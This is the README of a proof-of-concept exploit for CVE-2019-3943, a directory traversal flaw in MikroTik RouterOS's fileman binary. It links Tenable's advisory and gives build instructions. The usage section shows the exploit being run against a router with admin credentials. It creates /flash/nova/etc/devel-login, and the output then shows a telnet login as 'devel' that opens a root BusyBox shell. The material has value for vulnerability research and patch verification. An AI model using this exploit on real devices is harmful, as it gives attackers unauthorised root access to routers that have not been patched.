# CVE-2019-3943 Flash Dev Shell Proof of Concept

This is an implementation of CVE-2019-3943 which is a directory traversal vulnerability affecting the fileman binary in Router OS. This vulnerability was patched in 6.44RC1. See Tenable's advisory at: https://www.tenable.com/security/research/tra-2019-16 

The PoC creates the file /flash/nova/etc/devel-login that enables the devel shell in 6.0 - 6.40.9

## What are the build dependencies?

This requires:

* Boost 1.66 or higher
* cmake

## How do I build this jawn?

Just normal cmake. Try this:

```sh
mkdir build
cd build
cmake ..
make
```

Resolve dependencies as needed.

## Usage

```sh
albinolobster@ubuntu:~/routeros_internal/poc/cve_2019_3943_dev_shell/build$ ./cve_2019_3943_dev_shell -i 192.168.1.18 -u admin
Success!
albinolobster@ubuntu:~/routeros_internal/poc/cve_2019_3943_dev_shell/build$ telnet 192.168.1.18
Trying 192.168.1.18...
Connected to 192.168.1.18.
Escape character is '^]'.

MikroTik v6.39.3 (bugfix)
Login: devel
Password: 


BusyBox v1.00 (2017.10.10-07:06+0000) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

# 
```
